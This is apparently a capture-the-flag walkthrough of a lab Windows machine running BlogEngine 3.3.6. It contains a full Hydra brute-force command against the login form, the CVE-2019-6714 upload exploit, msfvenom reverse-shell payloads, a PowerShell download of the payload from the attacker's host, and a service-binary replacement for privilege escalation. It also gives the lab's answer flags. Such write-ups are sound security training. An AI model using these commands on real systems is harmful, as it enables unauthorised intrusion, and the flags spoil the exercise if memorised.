## Task 1 - Deploy the vulnerable Windows machine 

This room will cover brute-forcing an accounts credentials, handling public exploits, using the Metasploit framework and privilege escalation on Windows.

##   Answer the questions below

**Deploy the machine and access its web server.**

**Whats the name of the clown displayed on the homepage?**

- Pennywise (reverse image search)

* * * 

## Task 2 - Using Hydra to brute-force a login

| Command | Description |
|---------|-------------|
| ``hydra -P <wordlist> -v <ip> <protocol>`` | Brute force against a protocol of your choice |
| ``hydra -v -V -u -L <username list> -P <password list> -t 1 -u <ip> <protocol>`` | You can use Hydra to bruteforce usernames as well as passwords. It will loop through every combination in your lists. (-vV = verbose mode, showing login attempts) |
| ``hydra -t 1 -V -f -l <username> -P <wordlist> rdp://<ip>`` | Attack a Windows Remote Desktop with a password list. |
| ``hydra -l <username> -P .<password list> $ip -V http-form-post '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1:S=Location'`` | Craft a more specific request for Hydra to brute force. |

##   Answer the questions below

**What request type is the Windows website login form using?**

- POST

**Guess a username, choose a password wordlist and gain credentials to a user account!**

- Craft hydra 

```
hydra -t 16 -l admin -P /usr/share/seclists/Passwords/xato-net-10-million-passwords-10000.txt 10.10.85.208 http-post-form "/Account/login.aspx:__VIEWSTATE=DwoboO4H6Lg0TVWgRpjNYIfKsqKTMsi6KZ%2FrLpvJsIRyXNLRSf3AR8CTQMQTYcdrLBGAP%2FYDhPf8rKSl4hOkXldcWG7BXJ9ELa5Rq8rH0osikXzZMXuVA17TmDJ6KPlI3BFrN31Tw8troT51IiMPW9VhjPvhT96NGMusiERE9NDv1Hnfqv19MQnu2jmwQCefYRSh1T5mSmXl%2FDzykSgz6WRGKNFo8666FszWs1GgT%2FRDfl8PEOgpJIlYI5WQ3BpiM76RCqXETcYlPzjFDuHgR0OWP1QrrPCM8vf6YJozaosZ%2BWjlbQiCbqxkcXixtvfHE0kfoVNVr66Z%2FtNXfRDr67%2Fzz77%2FM6ywjkRiBN1%2Fdg5x7WeK&__EVENTVALIDATION=O%2FQ9GaTABmLsQKQUlAi8Z0FcLkfY6na0%2Fx4VNKOEmfdxE89nHewkLLaJzx96uT1fyeQFoIQYNtTiYaByuOlt682ZQ9ukMSDtwo7Mi9HYOdgj2zrPzayN2T9TYjl%2F8nWx2K1JetpiiOI1e0vO2FhO9OTKLgeOocGzPM1WciR5gWrO34MZ&ctl00%24MainContent%24LoginUser%24UserName=^USER^&ctl00%24MainContent%24LoginUser%24Password=^PASS^&ctl00%24MainContent%24LoginUser%24LoginButton=Log+in:Login failed"

## Task 3 Compromise the machine 

In this task, you will identify and execute a public exploit (from exploit-db.com) to get initial access on this Windows machine!

Exploit-Database is a CVE (common vulnerability and exposures) archive of public exploits and corresponding vulnerable software, developed for the use of penetration testers and vulnerability researches. It is owned by Offensive Security (who are responsible for OSCP and Kali)

##   Answer the questions below

**Now you have logged into the website, are you able to identify the version of the BlogEngine?**

- Visiting About Page we find Version 3.3.6.0

**Use the exploit database archive to find an exploit to gain a reverse shell on this system.**

- ``searchsploit blog engine``

**What is the CVE?**

- CVE-2019-6714

**Using the public exploit, gain initial access to the server.**

- Visit ``/admin/app/editor/editpost.cshtml`` and use file manager to upload edited ``46353.cs`` as ``PostView.ascx``
- Access file @ ``/?theme=../../App_Data/files``

**Who is the webserver running as?**

- iis apppool\blog

## Task 4 - Windows Privilege Escalation 

**Our netcat session is a little unstable, so lets generate another reverse shell using msfvenom.**

- ``systeminfo`` to find system type for msfvenom

```

- Create a reverse shell ``msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.x.x.x LPORT=7777 -f exe > thm/rooms/hackpark/reverse.exe`` and upload.
- Find the webserver directory ``dir App_Data /AD /s``
- start msfconsole with ``multi/handler`` and payload ``windows/meterpreter/reverse_tcp`` 
- start the uploaded shell on the target pc 

##   Answer the questions below

You can run metasploit commands such as sysinfo to get detailed information about the Windows system. Then **feed this information into the windows-exploit-suggester script** and quickly identify any obvious vulnerabilities.

**What is the OS version of this windows machine?**

```shell
meterpreter > sysinfo
Computer        : HACKPARK
OS              : Windows 2012 R2 (6.3 Build 9600).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 1
Meterpreter     : x86/windows
````

- Windows 2012 R2 (6.3 Build 9600)

**Further enumerate the machine.**

- in target machine: ``sysinfo`` copy to sysinfo.txt
- on kali input ``wes sysinfo.txt > system_vulns.txt``
- ``subl system_vulns.txt``
- upload ``winPEASx64.exe`` and run
- ``cmdkey /list``

**What is the name of the abnormal service running?**

- our winpeas found AWSLiteAgent and WindowsScheduler
- ``tasklist /svc``
- Windows Scheduler (WService.exe)

**What is the name of the binary you're supposed to exploit?**

- We need to find the logs of Windows Scheduler

1. ``dir \WService.exe /s`` from root directory to find where we going

```shell
c:\>dir \WService.exe /s
dir \WService.exe /s
 Volume in drive C has no label.
 Volume Serial Number is 0E97-C552

 Directory of c:\Program Files (x86)\SystemScheduler

03/25/2018  10:58 AM            98,720 WService.exe
               1 File(s)         98,720 bytes

     Total Files Listed:
               1 File(s)         98,720 bytes
               0 Dir(s)  39,125,811,200 bytes free
```

2. LogsFile.txt and LogFileAdvanced.txt show us nothing, but ``type 20198415519.INI_LOG.txt`` we see 

```shell
06/22/22 01:02:33,Process Ended. PID:996,ExitCode:4,Message.exe (Administrator)
06/22/22 01:03:01,Event Started Ok, (Administrator)
```

**Using this abnormal service, escalate your privileges!**

Few things I can do. schtasks or replace message.exe with another reverse shell

- replacing message.exe gives administrator access.

**What is the user flag (on Jeffs Desktop)?**

- 759bd8af507517bcfaede78a21a73e39

**What is the root flag?**

- 7e13d97f05f7ceb9881a3eb3d78d3e72 c:\Users\Administrator\Desktop>type root.txt

## Task 5 - Privilege Escalation Without Metasploit 

In this task we will escalate our privileges without the use of meterpreter/metasploit! 

Firstly, we will pivot from our netcat session that we have established, to a more stable reverse shell.

Once we have established this we will use winPEAS to enumerate the system for potential vulnerabilities, before using this information to escalate to Administrator.

![0xskar](/assets/winpeas.png)

##   Answer the questions below

**Now we can generate a more stable shell using msfvenom, instead of using a meterpreter, This time let's set our payload to windows/shell_reverse_tcp**

- ``msfvenom -p windows/shell_reverse_tcp LHOST=10.x.x.x LPORT=6666 -f exe -o reverse_privesc.exe``

After generating our payload we need to pull this onto the box using powershell.

Tip: It's common to find C:\Windows\Temp is world writable!

1. setup webserver ``python3 -m http.server``
2. powershell over to target ``powershell -c "Invoke-WebRequest -Uri '10.x.x.x:8000/reverse_privesc.exe' -OutFile 'C:\Windows\Temp\shell.exe'"``
3. run our shell ``shell.exe``

Now you know how to pull files from your machine to the victims machine, we can pull winPEAS.bat to the system using the same method! (You can find winPEAS here)

WinPeas is a great tool which will enumerate the system and attempt to recommend potential vulnerabilities that we can exploit. The part we are most interested in for this room is the running processes!

Tip: You can execute these files by using .\filename.exe

Using winPeas, what was the Original Install time? (This is date and time)

- 8/3/2019, 10:43:23 AM (couldn't find this in winpeas for the life of me but systeminfo)
